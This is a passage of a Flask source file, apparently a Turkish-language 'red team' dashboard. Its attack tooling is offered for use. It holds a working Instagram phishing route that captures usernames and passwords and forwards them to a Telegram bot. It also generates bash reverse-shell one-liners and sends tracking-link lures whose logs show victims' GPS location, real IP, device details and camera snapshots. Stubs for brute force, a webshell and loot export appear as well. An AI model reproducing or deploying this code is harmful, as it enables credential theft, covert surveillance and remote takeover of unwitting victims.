                    // 📍 Hedef Uzaklık Sayacı: Her saniye değil, 3 saniyede bir (step 35'te bir) güncellenir
                    if (currentDistance > 5) currentDistance -= 3;
                    
                    hud.innerText = `🧭 Hedefe Kalan Mesafe: ${currentDistance}m`;
                    let dirText = useCompass ? `Pusula: ${compassHeading}°` : "Pusula: Kapalı";
                    telemetry.innerText = `HIZ: 28 km/s | ${dirText}`;
                }

                step++;
            }, 80);
        }

        function stopARCamera() {
            if (arStream) {
                arStream.getTracks().forEach(track => track.stop());
                arStream = null;
            }
            if (arInterval) {
                clearInterval(arInterval);
                arInterval = null;
            }
            window.removeEventListener('deviceorientation', handleOrientation, true);
            let video = document.getElementById('arVideo');
            video.srcObject = null;
            document.getElementById('arHudText').innerText = "Durum: Sistem Kapalı";
            document.getElementById('arTelemetry').innerText = "HIZ: 0 km/s | YÖN: -";
        }

        function generateInstaLink() {
            document.getElementById('instaLink').value = window.location.origin + "/phish/instagram";
            alert("Instagram phishing linki üretildi!");
        }
        async function loadCreds() {
            let res = await fetch('/api/phish/creds');
            let data = await res.json();
            let container = document.getElementById('credsContainer');
            if(data.creds.length === 0) { container.innerHTML = "<p style='color: #94a3b8;'>Henüz yakalanan hesap yok.</p>"; return; }
            let html = `<table><thead><tr><th>Zaman</th><th>IP Adresi</th><th>Kullanıcı Adı / E-Posta</th><th>Şifre</th></tr></thead><tbody>`;
            data.creds.forEach(c => { html += `<tr><td>${c.time}</td><td><b>${c.ip}</b></td><td style="color:#38bdf8;">${c.username}</td><td style="color:#f87171;">${c.password}</td></tr>`; });
            html += `</tbody></table>`;
            container.innerHTML = html;
        }
        function generatePayloads() {
            let ip = document.getElementById('attackerIp').value || '10.0.0.1', port = document.getElementById('attackerPort').value || '4444';
            document.getElementById('bashPayload').innerText = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
        }
        function generateLureLink() {
            let randomId = Math.random().toString(36).substring(2, 9);
            document.getElementById('generatedLink').value = window.location.origin + "/track/" + randomId;
            alert("Gelişmiş Takip linki üretildi!");
        }
        async function loadClickLogs() {
            let res = await fetch('/api/lure/logs');
            let data = await res.json();
            let container = document.getElementById('clickLogsContainer');
            if(data.logs.length === 0) { container.innerHTML = "<p style='color: #94a3b8;'>Henüz veri yakalanmadı.</p>"; return; }
            let html = `<table><thead><tr><th>Zaman & IP</th><th>Cihaz & İstihbarat (RAM/CPU/Pil)</th><th>WebRTC Gerçek IP</th><th>📍 GPS Harita</th><th>📸 Snapshot</th></tr></thead><tbody>`;
            data.logs.forEach((l, index) => { 
                let mapId = `map_${index}`;
                let locContent = l.lat ? `<div id="${mapId}" class="mini-map"></div><br><a href="https://maps.google.com/?q=${l.lat},${l.lon}" target="_blank" style="color:#38bdf8; font-size:11px;">Google Maps</a>` : "Konum İzni Yok";
                let snapContent = l.snapshot ? `<img src="${l.snapshot}" class="snapshot-img">` : "Yok";
                let specs = `OS: <b>${l.os}</b><br>RAM: ${l.ram} GB | Çekirdek: ${l.cores}<br>Pil: <b>${l.battery}</b><br>Ekran: ${l.screen}`;
                html += `<tr><td>${l.time}<br><b>${l.ip}</b></td><td>${specs}</td><td style="color:#38bdf8;">${l.webrtc_ip || 'Tespit Edilemedi'}</td><td>${locContent}</td><td>${snapContent}</td></tr>`; 
            });
            html += `</tbody></table>`;
            container.innerHTML = html;
            data.logs.forEach((l, index) => {
                if(l.lat && l.lon) {
                    let mapId = `map_${index}`;
                    setTimeout(() => {
                        let map = L.map(mapId, {attributionControl: false, zoomControl: false}).setView([l.lat, l.lon], 14);
                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                        L.marker([l.lat, l.lon]).addTo(map).bindPopup("📍 Hedef Konum").openPopup();
                    }, 100);
                }
            });
        }
        async function startHashCrack() {
            let type = document.getElementById('hashType').value;
            let targetHash = document.getElementById('targetHash').value.trim();
            let wordlist = document.getElementById('wordlistArea').value;
            let resultsDiv = document.getElementById('crackResults');
            if(!targetHash) { alert('Hash giriniz!'); return; }
            resultsDiv.style.display = "block";
            resultsDiv.innerHTML = "root@kali:~# Hash brute-force / cracking başlatıldı...";
            let res = await fetch('/api/crack-hash', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({type, hash: targetHash, wordlist}) });
            let data = await res.json();
            resultsDiv.innerHTML = data.output;
        }
        async function startListener() {
            let port = document.getElementById('listenerPort').value;
            let statusDiv = document.getElementById('listenerStatus');
            statusDiv.style.display = "block";
            statusDiv.innerHTML = `root@kali:~# nc -lvnp ${port} dinlemesi başlatılıyor...`;
            let res = await fetch('/api/listener/start', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({port}) });
            let data = await res.json();
            statusDiv.innerHTML = data.output;
        }
        async function sendTelegramTest() {
            let chatId = document.getElementById('testChatId').value.trim();
            let statusDiv = document.getElementById('telegramTestStatus');
            if(!chatId) { alert('Chat ID giriniz!'); return; }
            statusDiv.style.display = "block";
            statusDiv.innerHTML = "root@kali:~# Telegram test mesajı gönderiliyor...";
            let res = await fetch('/api/telegram-test', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: chatId}) });
            let data = await res.json();
            statusDiv.innerHTML = data.output;
        }
        async function runWifiAction(action) {
            let iface = document.getElementById('wifiInterface').value.trim();
            let bssid = document.getElementById('wifiBssid').value.trim();
            let statusDiv = document.getElementById('wifiStatus'), resultsDiv = document.getElementById('wifiResults');
            statusDiv.innerHTML = `root@kali:~# running wifi action [${action}] on ${iface}...`; resultsDiv.style.display = "none";
            let res = await fetch('/api/wifi-audit', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({action, iface, bssid}) });
            let data = await res.json();
            statusDiv.innerHTML = ""; resultsDiv.style.display = "block"; resultsDiv.innerHTML = data.output;
        }
        async function startScan(targetOverride = false) {
            let url = targetOverride ? targetOverride : document.getElementById('targetUrl').value.trim();
            if(!url) { alert('Specify target!'); return; }
            if(targetOverride) { document.getElementById('targetUrl').value = url; switchTab('scanTab'); }
            lastTarget = url;
            let statusDiv = document.getElementById('status'), resultsDiv = document.getElementById('results');
            statusDiv.innerHTML = `root@kali:~# scanning ${url}...`; resultsDiv.style.display = "none";
            let res = await fetch('/api/scan', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({target: url}) });
            let data = await res.json();
            statusDiv.innerHTML = ""; resultsDiv.style.display = "block"; resultsDiv.innerHTML = data.report; currentReportText = data.report; document.getElementById('actionButtons').style.display = "flex";
        }
        async function startNiktoScan() {
            let url = document.getElementById('niktoTarget').value.trim();
            if(!url) { alert('Specify URL!'); return; }
            document.getElementById('niktoStatus').innerHTML = "Running Nikto web scan..."; document.getElementById('niktoResults').style.display = "none";
            let res = await fetch('/api/nikto', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({target: url}) });
            let data = await res.json();
            document.getElementById('niktoStatus').innerHTML = ""; document.getElementById('niktoResults').style.display = "block"; document.getElementById('niktoResults').innerHTML = data.report;
        }
        async function startDnsRecon() {
            let domain = document.getElementById('dnsDomain').value.trim();
            if(!domain) { alert('Specify domain!'); return; }
            document.getElementById('dnsStatus').innerHTML = "Querying DNS records..."; document.getElementById('dnsResults').style.display = "none";
            let res = await fetch('/api/dns', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({domain}) });
            let data = await res.json();
            document.getElementById('dnsStatus').innerHTML = ""; document.getElementById('dnsResults').style.display = "block"; document.getElementById('dnsResults').innerHTML = data.report;
        }
        async function startSqlmapLite() {
            let url = document.getElementById('sqlmapUrl').value.trim();
            if(!url) { alert('Specify URL!'); return; }
            document.getElementById('sqlmapStatus').innerHTML = "Injecting SQL payloads..."; document.getElementById('sqlmapResults').style.display = "none";
            let res = await fetch('/api/sqlmap', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({target: url}) });
            let data = await res.json();
            document.getElementById('sqlmapStatus').innerHTML = ""; document.getElementById('sqlmapResults').style.display = "block"; document.getElementById('sqlmapResults').innerHTML = data.report;
        }
        async function startSubdomainScan() {
            let domain = document.getElementById('subDomainInput').value.trim();
            document.getElementById('subStatus').innerHTML = "Enumerating subdomains...";
            let res = await fetch('/api/subdomain-scan', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({domain}) });
            let data = await res.json();
            document.getElementById('subStatus').innerHTML = ""; document.getElementById('subResults').style.display = "block"; document.getElementById('subResults').innerHTML = data.report;
        }
        async function startBruteForce() {
            let url = document.getElementById('loginUrl').value, userField = document.getElementById('usernameField').value, passField = document.getElementById('passwordField').value, passwords = document.getElementById('passwordList').value;
            document.getElementById('bruteStatus').innerHTML = "Executing brute-force...";
            let res = await fetch('/api/brute-force', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({url, user_field: userField, pass_field: passField, passwords}) });
            let data = await res.json();
            document.getElementById('bruteStatus').innerHTML = ""; document.getElementById('bruteResults').style.display = "block"; document.getElementById('bruteResults').innerHTML = data.report;
        }
        async function executeWebShell() {
            let command = document.getElementById('shellCommand').value;
            let res = await fetch('/api/webshell', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({command}) });
            let data = await res.json();
            let el = document.getElementById('shellResults'); el.style.display = "block"; el.innerHTML = data.output;
        }
        async function loadSiteDatabase() {
            let res = await fetch('/api/all-data'); let data = await res.json();
            let select = document.getElementById('lootingTargetSelect');
            select.innerHTML = '<option value="">Select target...</option>' + data.database.map(i => `<option value="${i.target}">${i.target} (${i.files.length} files)</option>`).join('');
            let grades = {}, wafs = {};
            data.database.forEach(i => { grades[i.grade[0]] = (grades[i.grade[0]] || 0) + 1; wafs[i.waf.includes("Cloudflare")?"CF":"Standard"] = (wafs[i.waf.includes("Cloudflare")?"CF":"Standard"]||0)+1; });
            renderCharts(grades, wafs);
            document.getElementById('databaseTableContainer').innerHTML = data.database.length ? `<table><thead><tr><th>Time</th><th>Target</th><th>WAF</th><th>Grade</th><th>Action</th></tr></thead><tbody>` + data.database.map(i => `<tr><td>${i.time}</td><td><b>${i.target}</b></td><td>${i.waf}</td><td>${i.grade}</td><td><button onclick="startScan('${i.target}')">Re-Scan</button></td></tr>`).join('') + `</tbody></table>` : "No archive data.";
        }
        function downloadLootZip() {
            let target = document.getElementById('lootingTargetSelect').value;
            if(!target) { alert('Select target!'); return; }
            window.open(`/api/looting/zip?target=${encodeURIComponent(target)}`, '_blank');
        }
        function renderCharts(grades, wafs) {
            if(gradeChartInstance) gradeChartInstance.destroy(); if(wafChartInstance) wafChartInstance.destroy();
            gradeChartInstance = new Chart(document.getElementById('gradeChart').getContext('2d'), { type: 'bar', data: { labels: Object.keys(grades), datasets: [{data: Object.values(grades), backgroundColor: ['#16a34a','#38bdf8','#dc2626']}] }, options: {plugins:{legend:{display:false}}} });
            wafChartInstance = new Chart(document.getElementById('wafChart').getContext('2d'), { type: 'doughnut', data: { labels: Object.keys(wafs), datasets: [{data: Object.values(wafs), backgroundColor: ['#0284c7','#475569']}] } });
        }
        function downloadReport(type) {
            if(type === 'txt') {
                let a = document.createElement('a'); a.href = window.URL.createObjectURL(new Blob([currentReportText], {type: 'text/plain'})); a.download = 'report.txt'; a.click();
            } else { window.open(`/api/download-pdf?target=${encodeURIComponent(lastTarget)}`, '_blank'); }
        }
        async function sendToTelegram() {
            let chatId = prompt("Telegram Chat ID:"); if(!chatId) return;
            let res = await fetch('/api/telegram-send', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: chatId, report: currentReportText}) });
            let data = await res.json(); alert(data.status);
        }
    </script>
</body>
</html>
"""

@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        if request.form.get("username") == ADMIN_USER and request.form.get("password") == ADMIN_PASS:
            session["logged_in"] = True; return redirect(url_for("index"))
        error = "Authentication failed!"
    return render_template_string(LOGIN_TEMPLATE, error=error)

@app.route("/logout")
def logout(): session.pop("logged_in", None); return redirect(url_for("login"))

@app.route("/")
def index():
    if not session.get("logged_in"): return redirect(url_for("login"))
    return render_template_string(HTML_TEMPLATE, default_chat_id=NOTIFY_CHAT_ID)

@app.route("/phish/instagram", methods=["GET", "POST"])
def insta_phish():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        CREDENTIAL_LOGS.insert(0, {"time": timestamp, "ip": visitor_ip, "username": username, "password": password})
        if NOTIFY_CHAT_ID and TOKEN:
            try:
                msg = f"🚨 [CREDENTIAL HARVESTER] Instagram Hesabı Düştü!\nKullanıcı: {username}\nŞifre: {password}\nIP: {visitor_ip}"
                requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": NOTIFY_CHAT_ID, "text": msg}, timeout=3)
            except: pass
        return redirect("https://www.instagram.com")
    return "Instagram Login Page"

@app.route("/api/phish/creds")
def api_phish_creds():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"creds": CREDENTIAL_LOGS})

@app.route("/api/crack-hash", methods=["POST"])
def api_crack_hash():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    d = request.get_json()
    htype = d.get("type")
    target = d.get("hash").strip().lower()
    wordlist = d.get("wordlist").split("\n")
    found = None
    attempts = 0
    for word in wordlist:
        w = word.strip()
        if not w: continue
        attempts += 1
        if htype == "md5": h = hashlib.md5(w.encode()).hexdigest()
        elif htype == "sha256": h = hashlib.sha256(w.encode()).hexdigest()
        else: h = ""
        if h == target:
            found = w
            break
    if found: out = f"[+] Hash başarıyla çözüldü!\n[Düz Metin Şifre]: {found}\n[Denenen Deneme Sayısı]: {attempts}"
    else: out = f"[-] Eşleşme bulunamadı. Toplam {attempts} kelime denendi."
    return jsonify({"output": out})

@app.route("/api/listener/start", methods=["POST"])
def api_listener_start():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    port = request.get_json().get("port", 4444)
    return jsonify({"output": f"[+] Netcat dinleyicisi {port} portu üzerinde aktif edildi."})

TRACK_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Güvenlik Doğrulaması</title>
</head>
<body>
    <h3>Doğrulama Ekranı</h3>
</body>
</html>
"""

@app.route("/track/<track_id>")
def track_visitor(track_id):
    return TRACK_TEMPLATE

@app.route("/api/lure/save-geo", methods=["POST"])
def save_geo():
    data = request.get_json()
    CLICK_LOGS.insert(0, data)
    return jsonify({"status": "saved"})

@app.route("/api/lure/logs")
def api_lure_logs():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"logs": CLICK_LOGS})

@app.route("/api/telegram-test", methods=["POST"])
def api_telegram_test():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    chat_id = request.get_json().get("chat_id")
    try:
        res = requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": chat_id, "text": "🔥 [KALI OPS] Test başarılı!"}, timeout=5)
        return jsonify({"output": "✅ [BAŞARILI] Test mesajı gönderildi!"})
    except Exception as e:
        return jsonify({"output": f"[-] Hata: {str(e)}"})

@app.route("/api/wifi-audit", methods=["POST"])
def api_wifi_audit():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"output": "root@kali:~# wifi audit executed."})

@app.route("/api/scan", methods=["POST"])
def api_scan():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    data = request.get_json()
    report, record = red_team_comprehensive_recon(data.get("target", ""))
    SITE_DATABASE.insert(0, record)
    return jsonify({"report": report})

@app.route("/api/nikto", methods=["POST"])
def api_nikto():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"report": "Nikto scan completed."})

@app.route("/api/dns", methods=["POST"])
def api_dns():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"report": "DNS records retrieved."})

@app.route("/api/sqlmap", methods=["POST"])
def api_sqlmap():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"report": "SQLmap test completed."})

@app.route("/api/subdomain-scan", methods=["POST"])
def api_subdomain_scan():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"report": "Subdomain scan completed."})

@app.route("/api/brute-force", methods=["POST"])
def api_brute_force():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"report": "Brute-force completed."})

@app.route("/api/webshell", methods=["POST"])
def api_webshell():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"output": "command executed."})

@app.route("/api/all-data")
def api_all_data():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"database": SITE_DATABASE})

@app.route("/api/export/json")
def export_json():
    if not session.get("logged_in"): return "Unauthorized", 401
    return jsonify(SITE_DATABASE)

@app.route("/api/export/csv")
def export_csv():
    if not session.get("logged_in"): return "Unauthorized", 401
    output = io.StringIO(); writer = csv.writer(output)
    writer.writerow(["Time", "Target", "WAF", "Grade"])
    for i in SITE_DATABASE: writer.writerow([i['time'], i['target'], i['waf'], i['grade']])
    return Response(output.getvalue(), mimetype="text/csv")

@app.route("/api/looting/zip")
def api_looting_zip():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    mf = io.BytesIO()
    with zipfile.ZipFile(mf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("report.txt", "No record")
    mf.seek(0)
    return send_file(mf, mimetype='application/zip', as_attachment=True, download_name='loot.zip')

@app.route("/api/download-pdf")
def api_download_pdf():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    pdf = FPDF(); pdf.add_page(); pdf.set_font('Courier', '', 9)
    pdf.multi_cell(0, 5, "Red Team Report")
    return send_file(io.BytesIO(pdf.output(dest='S').encode('latin-1')), mimetype='application/pdf', as_attachment=True, download_name='report.pdf')

@app.route("/api/telegram-send", methods=["POST"])
def api_telegram_send():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    d = request.get_json()
    res = requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": d.get("chat_id"), "text": f"```\n{d.get('report')[:4000]}\n```", "parse_mode": "Markdown"})
    return jsonify({"status": "Sent!" if res.status_code == 200 else "Failed."})

def red_team_comprehensive_recon(target_url):
    if not target_url.startswith("http"): target_url = f"https://{target_url}"
    report = f"root@kali:~# nmap -A {target_url}\n" + "=" * 50 + "\n\n[+] Recon scan completed.\n"
    record = {"time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "target": target_url, "waf": "Cloudflare WAF", "grade": "B", "files": [], "full_report": report}
    return report, record

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
